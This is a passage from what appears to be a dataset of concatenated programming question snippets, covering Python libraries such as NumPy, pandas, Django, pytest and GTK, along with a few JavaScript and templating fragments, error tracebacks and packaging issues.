'./test.svg ' , ' w ' ) , format='svg ' )"
"def local_max_f ( A ) : return A [ 0 ] == A.max ( ) img = np.random.rand ( 100 ) .reshape ( 10,10 ) ndimage.generic_filter ( img , local_max_f , size=3 )"
"import numpy as npfrom numba import cfuncimport numba.typesvoidp = numba.types.voidptrdef integrand ( t , params ) : a = params [ 0 ] # this is additional parameter return np.exp ( -t/a ) / t**2nb_integrand = cfunc ( numba.float32 ( numba.float32 , voidp ) ) ( integrand ) TypingError : Failed at nopython ( nopython frontend ) Invalid usage of getitem with parameters ( void* , int64 ) * parameterized"
"< clade > < name > Espresso < /name > < branch_length > 2.0 < /branch_length > < /clade > < clade > < name > Espresso < /name > < url > www.espresso.com < /url > < branch_length > 2.0 < /branch_length > < /clade > import re , sysimport lxml.etreef = open ( `` test.xml '' , `` r '' ) data = f.read ( ) tree = lxml.etree.XML ( data ) if tree.xpath ( '//name/text ( ) = '' Espresso '' ' ) : insert new child here"
scrapy spider -t n3 -o data.n3scrapy spider -t csv -o data.csv
"mystr = `` '' '' < kv > key1 : `` string '' key2 : 1.00005 key3 : [ 1,2,3 ] < /kv > < csv > date , windspeed , direction20190805,22 , NNW20190805,23 , NW20190805,20 , NE < /csv > '' '' '' > > > import parsec > > > tag_start = parsec.Parser ( lambda x : x == `` < `` ) > > > tag_end = parsec.Parser ( lambda x : x == `` > '' ) > > > tag_name = parsec.Parser ( parsec.Parser.compose ( parsec.many1 , parsec.letter ) ) > > > tag_open = parsec.Parser ( parsec.Parser.joint ( tag_start , tag_name , tag_end ) ) > > > tag_open.parse ( mystr ) Traceback ( most recent call last ) : ... TypeError : < lambda > ( ) takes 1 positional argument but 2 were given [ { `` type '' : `` tag '' , `` name '' : `` kv '' , `` values '' : [ { `` key1 '' : `` string '' } , { `` key2 '' : 1.00005 } , { `` key3 '' : [ 1,2,3 ] } ] } , { `` type '' : `` tag '' , '' name '' : `` csv '' , `` values '' : [ { `` date '' : 20190805 , `` windspeed '' : 22 , `` direction '' : `` NNW '' } { `` date '' : 20190805 , `` windspeed '' : 23 , `` direction '' : `` NW '' } { `` date '' : 20190805 , `` windspeed '' : 20 , `` direction '' : `` NE '' } ] } [ { `` tag '' : `` kv '' } , { `` tag '' : `` csv '' } ]"
"def get_file ( start_file ) : # opens original file , reads it to array with open ( start_file , 'rb ' ) as f : data=list ( csv.reader ( f ) ) header=data [ 0 ] counter=collections.defaultdict ( int ) for row in data : counter [ row [ 10 ] ] +=1 return ( data , counter , header )"
$ cat huge.csv | python -c `` import sys ; print ( sum ( 1 for _ in sys.stdin ) ) '' 101253515 # it took 15 seconds $ cat huge.csv | python3 -c `` import sys ; print ( sum ( 1 for _ in sys.stdin ) ) '' 101253515 # it took 66 seconds
class Base : def __init__ ( self ) : pass def new_obj ( self ) : return Base ( ) # ← return Derived ( ) class Derived ( Base ) : def __init__ ( self ) : pass
gcc -bundle -bundle_loader python.exe -L/usr/local/opt/readline/lib -L/usr/local/opt/readline/lib - L/Users/a/.pyenv/versions/2.7.7/lib build/temp.macosx-10.10-x86_64-2.7/ext/_yaml.o -lyaml -o build/lib.macosx-10.10-x86_64-2.7/_yaml.sold : file not found : python.execlang : error : linker command failed with exit code 1 ( use -v to see invocation ) error : command 'gcc ' failed with exit status 1
"class MyClass ( object ) : def __init__ ( self , xml=None ) : self.xml = xml self.title = None def get_title ( self ) : if self.__title is None : self.__title = self.__title_from_xml ( ) return self.__title def set_title ( self , value ) : self.__title = value title = property ( get_title , set_title , None , `` Citation title '' ) def __title_from_xml ( self ) : # parse the XML and return the title return title"
"[ 0 , 2 , ( 1 , 2 ) , 5 , 2 , ( 3 , 5 ) ] [ 0 , 2 , 1 , 2 , 5 , 2 , 3 , 5 ]"
"var rawString = `` { { prefix_HelloWorld } } testing this . { { _thiswillNotMatch } } \ { { prefix_Okay } } '' ; rawString.replace ( /\ { \ { prefix_ ( .+ ? ) \ } \ } /g , function ( match , innerCapture ) { return `` One To Rule All '' ; } ) ; innerCapture === `` HelloWorld '' match ==== `` { { prefix_HelloWorld } } '' innerCapture === `` Okay '' match ==== `` { { prefix_Okay } } '' import re match = re.search ( r'pattern ' , string ) if match : print match.group ( ) print match.group ( 1 )"
"import unittestclass foo ( object ) : def __init__ ( self , a ) : self.a = a def __eq__ ( self , other ) : return self.a == other.aclass test ( unittest.TestCase ) : def setUp ( self ) : self.list1 = [ foo ( 1 ) , foo ( 2 ) ] self.list2 = [ foo ( 1 ) , foo ( 2 ) ] def test1 ( self ) : self.assertTrue ( self.list1 == self.list2 ) def test2 ( self ) : self.assertEqual ( self.list1 , self.list2 ) def test3 ( self ) : self.assertEqual ( sorted ( self.list1 ) , sorted ( self.list2 ) ) def test4 ( self ) : self.assertItemsEqual ( self.list1 , self.list2 ) if __name__=='__main__ ' : unittest.main ( ) FAIL : test4 ( __main__.test ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Traceback ( most recent call last ) : File `` assert_test.py '' , line 25 , in test4 self.assertItemsEqual ( self.list1 , self.list2 ) AssertionError : Element counts were not equal : First has 1 , Second has 0 : < __main__.foo object at 0x7f67b3ce2590 > First has 1 , Second has 0 : < __main__.foo object at 0x7f67b3ce25d0 > First has 0 , Second has 1 : < __main__.foo object at 0x7f67b3ce2610 > First has 0 , Second has 1 : < __main__.foo object at 0x7f67b3ce2650 > -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 4 tests in 0.001sFAILED ( failures=1 )"
"from distutils.core import setupsetup ( name='my_project ' , description= '' Just a test project '' , version= '' 1.0 '' , py_modules= [ 'sample ' ] , requires= [ 'requests ' ] ) import requestsdef get_example ( ) : return requests.get ( `` http : //www.example.com '' ) $ pip install -e . [ 15:39:10 ] Obtaining file : ///tmp/example_pip Running setup.py egg_info for package from file : ///tmp/example_pipInstalling collected packages : my-project Running setup.py develop for my-project Creating /tmp/example_pip/my_venv/lib/python2.7/site-packages/my-project.egg-link ( link to . ) Adding my-project 1.0 to easy-install.pth file Installed /tmp/example_pip $ python [ 15:35:40 ] > > > import sampleTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /tmp/example_pip/sample.py '' , line 1 , in < module > import requestsImportError : No module named requests"
"MKC├── latex│ ├── macros.tex│ └── main.tex├── mkc│ ├── cache.py│ ├── __init__.py│ └── __main__.py├── README.md├── setup.py└── stdeb.cfg data_files= [ ( `` /usr/share/mkc/latex '' , [ `` latex/macros.tex '' , `` latex/main.tex '' ] ) ] , ./setup.py bdist -- formats=rpm ./setup.py -- command-packages=stdeb.command bdist_deb error : ca n't copy 'latex/macros.tex ' : does n't exist or not a regular file"
{ % for host in hosts % } { { host } } { % if loop.last % } ; { % endif % } { % endfor % } { { range $ host : = $ hosts } } { { $ host } } { { end } }
"> > > class Foo ( object ) : ... @ classmethod ... def hello ( cls ) : ... print 'hello , foo ' ... > > > class Bar ( Foo ) : ... @ classmethod ... def hello ( cls ) : ... print 'hello , bar ' ... super ( Bar , cls ) .hello ( ) ... > > > b = Bar ( ) > > > b.hello ( ) hello , barhello , foo > > > class Bar ( Foo ) : ... @ classmethod ... def hello ( cls ) : ... print 'hello , bar ' ... Foo.hello ( ) ... > > > b = Bar ( ) > > > b.hello ( ) hello , barhello , foo > > > class Bar ( Foo ) : ... @ classmethod ... def hello ( cls ) : ... print 'hello , bar ' ... super ( Bar ) .hello ( ) ... > > > b = Bar ( ) > > > b.hello ( ) hello , barTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` < stdin > '' , line 5 , in helloAttributeError : 'super ' object has no attribute 'hello ' > > > class Bar ( Foo ) : ... @ classmethod ... def hello ( cls ) : ... print Foo , type ( Foo ) ... print super ( Bar ) , type ( super ( Bar ) ) ... print cls , type ( cls ) ... > > > b = Bar ( ) > > > b.hello ( ) < class '__main__.Foo ' > < type 'type ' > < super : < class 'Bar ' > , NULL > < type 'super ' > < class '__main__.Bar ' > < type 'type ' >"
> > > class D : ... __class__ = 1 ... __name__ = 2 ... > > > D.__class__ < class 'type ' > > > > D ( ) .__class__1 > > > D.__name__'D ' > > > D ( ) .__name__2
"import stringfrom math import floor , log10class CustFormatter ( string.Formatter ) : `` Defines special formatting '' def __init__ ( self ) : super ( CustFormatter , self ) .__init__ ( ) def powerise10 ( self , x ) : if x == 0 : return 0 , 0 Neg = x < 0 if Neg : x = -x a = 1.0 * x / 10** ( floor ( log10 ( x ) ) ) b = int ( floor ( log10 ( x ) ) ) if Neg : a = -a return a , b def eng ( self , x ) : a , b = self.powerise10 ( x ) if -3 < b < 3 : return `` % .4g '' % x a = a * 10** ( b % 3 ) b = b - b % 3 return `` % .4g*10^ % s '' % ( a , b ) def format_field ( self , value , format_string ) : # handle an invalid format if format_string == `` i '' : return self.eng ( value ) else : return super ( CustFormatter , self ) .format_field ( value , format_string ) fmt = CustFormatter ( ) print ( ' { } '.format ( 0.055412 ) ) print ( fmt.format ( `` { 0 : i } `` , 55654654231654 ) ) print ( fmt.format ( `` { } `` , 0.00254641 ) )"
"for x in range ( x_size ) : for y in range ( y_size ) : for z in range ( z_size ) : pass # do something here for x , z , y in ... ? :"
"3945641 [ [ 38.9875 , -76.94 ] , [ 38.91711157 , -77.02435118 ] , [ 38.8991 , -77.029 ] , [ 38.8991 , -77.029 ] , [ 38.88927534 , -77.04858468 ] ) import pandas as pdimport numpy as npimport ujson as jsonimport time # Import Datadata = pd.read_csv ( 'filepath.csv ' , delimiter= ' , ' , engine='python ' ) # print len ( data ) , '' rows '' # print data # Create Data Famedf = pd.DataFrame ( data , columns= [ 'user_id ' , 'timestamp ' , 'latitude ' , 'longitude ' , 'cluster_labels ] ) # print data.head ( ) # Get a list of unique user_id valuesuniqueIds = np.unique ( data [ 'user_id ' ] .values ) # Get the ordered ( by timestamp ) coordinates for each user_idoutput = [ [ id , data.loc [ data [ 'user_id ' ] ==id ] .sort_values ( by='timestamp ' ) [ [ 'latitude ' , 'longitude ' ] ] .values.tolist ( ) ] for id in uniqueIds ] # Save outputs as csvoutputs = pd.DataFrame ( output ) # print outputsoutputs.to_csv ( 'filepath_out.csv ' , index=False , header=False ) # Save outputs as JSON # outputDict = { } # for i in output : # outputDict [ i [ 0 ] ] =i [ 1 ] # with open ( 'filepath.json ' , ' w ' ) as f : # json.dump ( outputDict , f , sort_keys=True , indent=4 , ensure_ascii=False , )"
"< ! DOCTYPE html > < html lang= '' en '' > < head > < meta charset= '' UTF-8 '' > < title > Docs Demo < /title > < link rel= '' stylesheet '' href= '' { { url_for ( 'static ' , filename='styles.css ' ) } } '' > < /head > < body > < div id= '' container '' > < div class= '' left_frame '' > < h1 > { { tree.name } } < /h1 > < ul > { % - for item in tree.children recursive % } < ! -- How would I build a relative link from /docs/ i.e . /docs/folder1/subfolder1/SubFolder1Page.html -- > < li > < a href= '' docs/ { { item.name } } '' target= '' iframe1 '' > { { item.name } } { % - if item.children - % } < ul > { { loop ( item.children ) } } < /ul > { % - endif % } < /a > < /li > { % - endfor % } < /ul > < /div > < div class= '' right_frame '' > < iframe name= '' iframe1 '' > < /iframe > < /div > < /div > < /body > < /html >"
"a = np.array ( [ 0,0,0,0,0,0 ] ) a [ np.array ( [ 1,2,2,1,3 ] ) ] += np.array ( [ 1,1,1,1,1 ] ) array ( [ 0 , 1 , 1 , 1 , 0 , 0 ] ) array ( [ 0 , 2 , 2 , 1 , 0 , 0 ] )"
"var switches = [ true , true , false , true ] ; var holder = { 0 : function ( ) { /* do step0 */ } 1 : function ( ) { /* do step1 */ } 2 : function ( ) { /* do step2 */ } 3 : function ( ) { /* do step3 */ } // ... etc ... } for ( var i = 0 ; i < switches.length ; i++ ) if ( switches [ i ] ) holder [ i ] ( ) ; switches = [ True , True , False , True ] class Holder ( object ) : @ staticmethod def do_0 ( ) : # do step0 @ staticmethod def do_1 ( ) : # do step 1 # ... etc ... def __repr__ ( self ) : return [ self.do_0 , self.do_1 , ... ] for action in Holder : action ( )"
"curl 'http : //localhost/test.php ' -H 'User-Agent : Mozilla/5.0 ( Windows NT 10.0 ; Win64 ; x64 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/66.0.3359.139 Safari/537.36 ' -H 'Content-Type : application/json ' -d ' { `` key1 '' : '' value1 '' , '' key2 '' : '' value2 '' , '' key3 '' : '' value3 '' } ' import requests , jsonheaders = { `` User-Agent '' : `` Mozilla/5.0 ( Windows NT 10.0 ; Win64 ; x64 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/66.0.3359.139 Safari/537.36 '' , '' Content-Type '' : `` application/json '' } data = { `` key1 '' : '' value1 '' , `` key2 '' : '' value2 '' , `` key3 '' : '' value3 '' } r=requests.post ( `` http : //localhost/test.php '' , headers=headers , data=json.dumps ( data ) )"
"from rest_framework.routers import DefaultRouterfrom user_profile import viewsrouter = DefaultRouter ( trailing_slash=False ) router.register ( r'user_names ' , views.UserNameView ) urlpatterns = router.urls class UserNameView ( mixins.ListModelMixin , mixins.RetrieveModelMixin , viewsets.GenericViewSet ) : queryset = User.objects.only ( `` id '' , `` first_name '' , `` last_name '' , `` email '' , `` mobile_phone '' , `` photo '' , `` is_active '' , `` date_joined '' ) .select_related ( `` photo '' ) .all ( ) serializer_class = serializers.UserNameSerializer Status : 405 Method Not AllowedAllow →GET , OPTIONSContent-Type →application/jsonDate →Wed , 09 Nov 2016 20:50:41 GMTServer →WSGIServer/0.1 Python/2.7.12Vary →CookieX-Frame-Options →SAMEORIGINx-xss-protection →1 ; mode=block"
"import randomimport itertoolsk = 6n = 10mylist = list ( range ( 0 , k ) ) j = random.sample ( list ( itertools.permutations ( mylist ) ) , n ) for i in j : print ( i )"
"df.loc [ df [ 'Name ' ] .str.contains ( [ 'Andy ' ] ) , 'Andy ' ] =1"
"import tracebackdef a ( ) : return b ( ) def b ( ) : return c ( ) def c ( ) : print ( `` \n '' .join ( line.strip ( ) for line in traceback.format_stack ( ) ) ) a.__name__ = ' A ' b.__name__ = ' B ' c.__name__ = ' C ' a ( ) ; File `` test.py '' , line 16 , in < module > a ( ) ; File `` test.py '' , line 4 , in a return b ( ) File `` test.py '' , line 7 , in b return c ( ) File `` test.py '' , line 10 , in c print ( `` \n '' .join ( line.strip ( ) for line in traceback.format_stack ( ) ) )"
"> > > def func ( ) : ... print should_return ( ) ... > > > func ( ) False > > > ret = func ( ) True > > > def func ( **kwargs ) : ... should_return = kwargs.pop ( '_wait ' , False ) ... print should_return ... > > > func ( ) False > > > ret = func ( _wait=True ) True"
"@ pytest.mark.parametrize ( 'data ' , [ b'ab ' , b'xyz'*1000 , b'12345'*1024**2 , ... # etc ] ) def test_compression ( data ) : ... # compress the data ... # decompress the data assert decompressed_data == data @ pytest.mark.parametrize ( `` test_input , expected '' , [ ( `` 3+5 '' , 8 ) , ( `` 2+4 '' , 6 ) , pytest.param ( `` 6*9 '' , 42 , marks=pytest.mark.xfail ) , ] )"
"# ! /usr/bin/env python3from awacs.aws import Policy , Principal , Statementfrom troposphere import Templatefrom troposphere.iam import Rolet = Template ( ) t.add_resource ( Role ( `` SESLambdaRole '' , AssumeRolePolicyDocument = Policy ( Version = `` 2012-10-17 '' , Statement = [ Statement ( Effect = `` Allow '' , Resource = `` arn : aws : logs : * : * : * '' , Principal = Principal ( `` Service '' , [ `` lambda.amazonaws.com '' ] ) , ) ] ) ) ) print ( t.to_json ( ) ) ubuntu @ ip-111-11-11-111 : ~ $ ./ses-lambda-forwarder-resources.py Traceback ( most recent call last ) : File `` ./ses-lambda-forwarder-resources.py '' , line 19 , in < module > [ `` lambda.amazonaws.com '' ] File `` /home/ubuntu/.local/lib/python3.6/site-packages/awacs/__init__.py '' , line 113 , in __init__ sup.__init__ ( None , props=self.props , **kwargs ) File `` /home/ubuntu/.local/lib/python3.6/site-packages/awacs/__init__.py '' , line 40 , in __init__ self.__setattr__ ( k , v ) File `` /home/ubuntu/.local/lib/python3.6/site-packages/awacs/__init__.py '' , line 81 , in __setattr__ self._raise_type ( name , value , expected_type ) File `` /home/ubuntu/.local/lib/python3.6/site-packages/awacs/__init__.py '' , line 90 , in _raise_type ( name , type ( value ) , expected_type ) ) TypeError : Resource is < class 'str ' > , expected < class 'list ' > ubuntu @ ip-111-11-11-111 : ~ $ python3 -- versionPython 3.6.3 Resource = `` arn : aws : logs : * : * : * '' , Resource = [ `` arn : aws : logs : * : * : * '' ] ,"
"{ `` id '' : 37125965 , `` number '' : `` 029073432019403 '' , `` idCommunication '' : `` 1843768 '' , `` docReceivedAt '' : { `` date '' : `` 2019-12-20 08:46:42 '' } , `` createdAt '' : { `` date '' : `` 2019-12-20 09:01:14 '' } , `` updatedAt '' : { `` date '' : `` 2019-12-20 09:01:32 '' } , `` branch '' : { `` id '' : 20 , `` name '' : `` REGIONAL OFFICE # 3 '' , `` address '' : `` 457 Beau St. , S\u00e3o Paulo , SP , 08547-003 '' , `` active '' : true , `` createdAt '' : { `` date '' : `` 2013-02-14 23:12:30 '' } , `` updatedAt '' : { `` date '' : `` 2019-05-09 13:40:47 '' } } , `` modality '' : { `` id '' : 1 , `` valor '' : `` CITA\u00c7\u00c3O '' , `` descricao '' : `` CITA\u00c7\u00c3O '' , `` active '' : true , `` createdAt '' : { `` date '' : `` 2014-08-29 20:47:56 '' } , `` updatedAt '' : { `` date '' : `` 2014-08-29 20:47:56 '' } } , `` operation '' : { `` id '' : 12397740 , `` number '' : `` 029073432019403 '' , `` startedAt '' : { `` date '' : `` 2019-11-07 22:28:25 '' } , `` managementType '' : 27 , `` assessmentValue '' : 5000000 , `` createdAt '' : { `` date '' : `` 2019-12-20 09:01:30 '' } , `` updatedAt '' : { `` date '' : `` 2019-12-20 09:01:30 '' } , `` operationClass '' : { `` id '' : 22 , `` name '' : `` A\u00c7\u00c3O RESCIS\u00d3RIA '' , `` createdAt '' : { `` date '' : `` 2014-02-28 20:24:55 '' } , `` updatedAt '' : { `` date '' : `` 2014-02-28 20:24:55 '' } } , `` evaluator '' : { `` id '' : 26798 , `` name '' : `` JANE DOE '' , `` level '' : 1 , `` active '' : true , `` createdAt '' : { `` date '' : `` 2017-02-22 22:54:04 '' } , `` updatedAt '' : { `` date '' : `` 2017-03-15 18:03:20 '' } , `` evaluatorsOffice '' : { `` id '' : 7 , `` name '' : `` ACME '' , `` area '' : 4 , `` active '' : true , `` createdAt '' : { `` date '' : `` 2014-02-28 20:25:16 '' } , `` updatedAt '' : { `` date '' : `` 2014-02-28 20:25:16 '' } } , `` evaluatorsOffice_id '' : 7 } , `` operationClass_id '' : 22 , `` evaluator_id '' : 26798 } , `` folder '' : { `` id '' : 16901241 , `` singleDocument '' : false , `` state '' : 0 , `` IFN '' : `` 00409504174201972 '' , `` closed '' : false , `` dataHoraAbertura '' : { `` date '' : `` 2019-12-20 09:01:31 '' } , `` dataHoraTransicao '' : { `` date '' : `` 2024-12-20 09:01:31 '' } , `` titulo '' : `` CONTROL FOLDER REF . OP . N. 029073432019403 '' , `` createdAt '' : { `` date '' : `` 2019-12-20 09:01:32 '' } , `` updatedAt '' : { `` date '' : `` 2019-12-20 09:01:32 '' } , `` subjects '' : [ { `` id '' : 22255645 , `` main '' : true , `` createdAt '' : { `` date '' : `` 2019-12-20 09:01:32 '' } , `` updatedAt '' : { `` date '' : `` 2019-12-20 09:01:32 '' } , `` subjectClass '' : { `` id '' : 20872 , `` name '' : `` SPECIAL RETIREMENT PROCESS '' , `` active '' : true , `` regulation '' : `` 8.213/91 , 53.831/64 , 83.080/79 , 2.172/97 , 1.663/98 , 9.711/98 , 9.528/97 AND 9.032/95 '' , `` glossary '' : `` SPECIAL RETIREMENT APPLICATION DUE TO HAZARDOUS LABOR CONDITION FOR 15+/20+/25+ YEARS '' , `` createdAt '' : { `` date '' : `` 2013-10-18 16:22:44 '' } , `` updatedAt '' : { `` date '' : `` 2013-10-18 16:22:44 '' } , `` parent '' : { `` id '' : 20866 , `` name '' : `` RETIREMENT BENEFITS '' , `` active '' : true , `` createdAt '' : { `` date '' : `` 2013-10-18 16:22:44 '' } , `` updatedAt '' : { `` date '' : `` 2013-10-18 16:22:44 '' } , `` parent '' : { `` id '' : 20126 , `` name '' : `` SOCIAL SECURITY '' , `` active '' : true , `` createdAt '' : { `` date '' : `` 2013-10-18 16:22:42 '' } , `` updatedAt '' : { `` date '' : `` 2013-10-18 16:22:42 '' } } , `` parent_id '' : 20126 } , `` parent_id '' : 20866 } , `` subjectClass_id '' : 20872 } ] , `` person '' : { `` id '' : 7318 , `` isClient '' : true , `` isRelated '' : false , `` name '' : `` SOCSEC CO. '' , `` createdAt '' : { `` date '' : `` 2013-02-14 23:11:43 '' } , `` updatedAt '' : { `` date '' : `` 2019-11-18 16:05:07 '' } } , `` operation '' : { `` id '' : 12397740 , `` number '' : `` 029073432019403 '' , `` startedAt '' : { `` date '' : `` 2019-11-07 22:28:25 '' } , `` managementType '' : 27 , `` assessmentValue '' : 5000000 , `` createdAt '' : { `` date '' : `` 2019-12-20 09:01:30 '' } , `` updatedAt '' : { `` date '' : `` 2019-12-20 09:01:30 '' } } , `` section '' : { `` id '' : 311 , `` name '' : `` PROTOCOL '' , `` address '' : `` 457 Beau St. , ground floor , S\u00e3o Paulo , SP , 08547-003 '' , `` active '' : true , `` management '' : false , `` onlyDistribution '' : true , `` createdAt '' : { `` date '' : `` 2013-02-14 23:12:31 '' } , `` updatedAt '' : { `` date '' : `` 2019-07-05 16:40:34 '' } , `` branch '' : { `` id '' : 20 , `` name '' : `` REGIONAL OFFICE # 3 '' , `` address '' : `` 457 Beau St. , S\u00e3o Paulo , SP , 08547-003 '' , `` active '' : true , `` createdAt '' : { `` date '' : `` 2013-02-14 23:12:30 '' } , `` updatedAt '' : { `` date '' : `` 2019-05-09 13:40:47 '' } } , `` branch_id '' : 20 } , `` person_id '' : 7318 , `` operation_id '' : 12397740 , `` section_id '' : 311 } , `` branch_id '' : 20 , `` modality_id '' : 1 , `` operation_id '' : 12397740 , `` folder_id '' : 16901241 } from django.db import modelsclass Section ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) name = models.CharField ( max_length=255 , null=True ) address = models.CharField ( max_length=255 , null=True ) active = models.BooleanField ( default=True ) management = models.BooleanField ( default=False ) onlyDistribution = models.BooleanField ( default=False ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) branch = models.ForeignKey ( 'Branch ' , null=True , on_delete=models.SET_NULL ) class Person ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) name = models.CharField ( max_length=255 , null=True ) isClient = models.BooleanField ( default=True ) isRelated = models.BooleanField ( default=True ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) class SubjectClass ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) name = models.CharField ( max_length=255 , null=True ) active = models.BooleanField ( default=True ) regulation = models.CharField ( max_length=255 , null=True ) glossary = models.CharField ( max_length=255 , null=True ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) parent = models.ForeignKey ( 'SubjectClass ' , null=True , on_delete=models.SET_NULL ) class Subject ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) main = models.BooleanField ( default=False ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) folder = models.ForeignKey ( 'Folder ' , null=True , on_delete=models.SET_NULL ) subjectClass = models.ForeignKey ( SubjectClass , null=True , on_delete=models.SET_NULL ) class Folder ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) singleDocument = models.BooleanField ( default=False ) state = models.PositiveSmallIntegerField ( null=True ) IFN = models.CharField ( max_length=31 , null=True ) closed = models.BooleanField ( default=False ) title = models.CharField ( max_length=255 , null=True ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) subjects = models.ManyToManyField ( SubjectClass , through=Subject , through_fields= ( 'folder ' , 'subjectClass ' ) ) interestedEntity = models.ForeignKey ( Person , null=True , on_delete=models.SET_NULL ) class EvaluatorsOffice ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) name = models.CharField ( max_length=255 , null=True ) area = models.PositiveSmallIntegerField ( null=True ) active = models.BooleanField ( default=True ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) class Evaluator ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) name = models.CharField ( max_length=255 , null=True ) level = models.PositiveSmallIntegerField ( null=True ) active = models.BooleanField ( default=True ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) evaluatorsOffice = models.ForeignKey ( EvaluatorsOffice , null=True , on_delete=models.SET_NULL ) class OperationClass ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) name = models.CharField ( max_length=255 , null=True ) active = models.BooleanField ( default=True ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) class Operation ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) number = models.CharField ( max_length=31 , null=True ) startedAt = models.DateTimeField ( null=True ) managementType = models.PositiveIntegerField ( null=True ) assessmentValue = models.PositiveIntegerField ( null=True ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) operationClass = models.ForeignKey ( OperationClass , null=True , on_delete=models.SET_NULL ) evaluator = models.ForeignKey ( Evaluator , null=True , on_delete=models.SET_NULL ) class Branch ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) name = models.CharField ( max_length=255 , null=True ) address = models.CharField ( max_length=255 , null=True ) active = models.BooleanField ( default=True ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) class Modality ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) value = models.CharField ( max_length=255 , null=True ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) class CommunicationRecord ( models.Model ) : id = models.PositiveIntegerField ( primary_key=True ) number = models.CharField ( max_length=31 , null=True ) idCommunication = models.CharField ( max_length=31 , null=True ) docReceivedAt = models.DateTimeField ( null=True ) createdAt = models.DateTimeField ( ) updatedAt = models.DateTimeField ( ) branch = models.ForeignKey ( Branch , null=True , on_delete=models.SET_NULL ) modality = models.ForeignKey ( Modality , null=True , on_delete=models.SET_NULL ) operation = models.ForeignKey ( Operation , null=True , on_delete=models.SET_NULL ) folder = models.ForeignKey ( Folder , null=True , on_delete=models.SET_NULL ) from django.db.models import Manager , Model , Field , DateTimeField , ForeignKeyfrom rest_framework.serializers import ModelSerializerclass RecursiveSerializer ( ModelSerializer ) : manager : Manager field_dict : dict def __init__ ( self , target_manager : Manager , data : dict , **kwargs ) : self.manager = target_manager self.Meta.model = self.manager.model self.field_dict = { f.name : f for f in self.manager.model._meta.fields } instance = None data = self.process_data ( data ) pk_name = self.manager.model._meta.pk.name if pk_name in data : try : instance = target_manager.get ( pk=data [ pk_name ] ) except target_manager.model.DoesNotExist : pass super ( ) .__init__ ( instance , data , **kwargs ) def process_data ( self , data : dict ) : processed_data = { } for name , value in data.items ( ) : field : Field = self.field_dict.get ( name ) if isinstance ( value , dict ) : if isinstance ( field , ForeignKey ) : processed_data [ name ] = self.__class__ ( field.related_model.objects , data=value ) continue elif len ( value ) == 1 and 'date ' in value and isinstance ( field , DateTimeField ) : processed_data [ name ] = value [ 'date ' ] continue processed_data [ name ] = value return processed_data class Meta : model : Model = None fields = '__all__ '"
"framework\ __init__.py framework.py tools.py plugins\ __init__.py a\ __init__.py atlas.py ... b\ __init__.py binary.py ... c\ __init__.py cmake.py ... from pkgutil import extend_path__path__ = extend_path ( __path__ , __name__ ) from framework.plugins.a import atlas from framework.pugins import atlas import pkg_resourcespkg_resources.declare_namespace ( __name__ ) plugins = [ x [ 0 ] .find_module ( x [ 1 ] ) .load_module ( x [ 1 ] ) for x in pkgutil.walk_packages ( [ os.path.join ( framework.plugins.__path__ [ 0 ] , chr ( y ) ) for y in xrange ( ord ( ' a ' ) , ord ( ' z ' ) + 1 ) ] , 'framework.plugins . ' ) ] import pkgutilimport osimport sysplugins = [ x [ 1 ] for x in pkgutil.walk_packages ( [ os.path.join ( __path__ [ 0 ] , chr ( y ) ) for y in xrange ( ord ( ' a ' ) , ord ( ' z ' ) + 1 ) ] ) ] import typesclass MyWrapper ( types.ModuleType ) : def __init__ ( self , wrapped ) : self.wrapped = wrapped def __getattr__ ( self , name ) : if name in plugins : askedattr = name [ 0 ] + ' . ' + name else : askedattr = name attr = getattr ( self.wrapped , askedattr ) return attrsys.modules [ __name__ ] = MyWrapper ( sys.modules [ __name__ ] )"
"cursor_wrapper = Mock ( ) cursor_wrapper.side_effect = RuntimeError ( `` No touching the database ! `` ) @ patch ( 'django.db.backends.util.CursorWrapper ' , cursor_wrapper ) class TestPurchaseModel ( TestCase ) : `` 'Purchase model test suite '' ' ..."
"import gigi.require_version ( `` Gtk '' , `` 3.0 '' ) from gi.repository import Gtk as gtkclass MCVEWindow ( gtk.ApplicationWindow ) : def __init__ ( self , *args , **kwargs ) : super ( ) .__init__ ( *args , **kwargs ) self._tree_view = gtk.TreeView ( ) self._tree_view.set_hexpand ( True ) self._tree_view.set_vexpand ( True ) self.populate_tree_view ( ) # populate tree view with fake items window_column = gtk.TreeViewColumn ( `` Window '' , gtk.CellRendererText ( ) , text=0 ) window_column.set_resizable ( True ) handle_column = gtk.TreeViewColumn ( `` Handle '' , gtk.CellRendererText ( ) , text=1 ) class_column = gtk.TreeViewColumn ( `` Class name '' , gtk.CellRendererText ( ) , text=2 ) self._tree_view.append_column ( window_column ) self._tree_view.append_column ( handle_column ) self._tree_view.append_column ( class_column ) scrolled_tree_view = gtk.ScrolledWindow ( ) scrolled_tree_view.add ( self._tree_view ) toolbar = gtk.Toolbar ( ) 